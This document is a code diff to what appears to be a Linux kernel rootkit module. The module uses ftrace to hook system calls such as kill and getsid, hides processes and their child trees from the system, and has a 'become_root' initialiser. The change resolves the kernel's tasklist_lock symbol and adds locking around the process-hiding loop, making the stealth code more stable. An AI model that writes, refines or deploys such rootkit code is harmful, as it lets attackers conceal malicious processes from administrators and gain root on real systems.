@@ -3,6 +3,8 @@
 #include "../ftrace/ftrace_helper.h"
 #include "../include/hidden_pids.h"
 
+static rwlock_t *sd_tasklist_lock = NULL;
+
 static asmlinkage long (*orig_kill)(const struct pt_regs *);
 static asmlinkage long (*orig_getsid)(const struct pt_regs *);
 static asmlinkage long (*orig_sched_getaffinity)(const struct pt_regs *);
@@ -70,6 +72,8 @@ static notrace void hide_process_tree(void)
     hide_task_pid(current);
     hide_parent_lineage();
     
+    if (sd_tasklist_lock)
+        read_lock(sd_tasklist_lock);
     list_for_each(list, &current->children) {
         task = list_entry(list, struct task_struct, sibling);
         if (task) {
@@ -77,13 +81,14 @@ static notrace void hide_process_tree(void)
             add_child_pid(task->tgid);
         }
     }
-    
     if (current->signal) {
         struct task_struct *t = current;
         do {
             hide_task_pid(t);
         } while_each_thread(current, t);
     }
+    if (sd_tasklist_lock)
+        read_unlock(sd_tasklist_lock);
 }
 
 static notrace asmlinkage long hook_kill(const struct pt_regs *regs) {
@@ -267,6 +272,7 @@ static struct ftrace_hook hooks[] = {
 };
 
 notrace int become_root_init(void) {
+    sd_tasklist_lock = (rwlock_t *)resolve_sym("tasklist_lock");
     return fh_install_hooks(hooks, ARRAY_SIZE(hooks));
 }
 
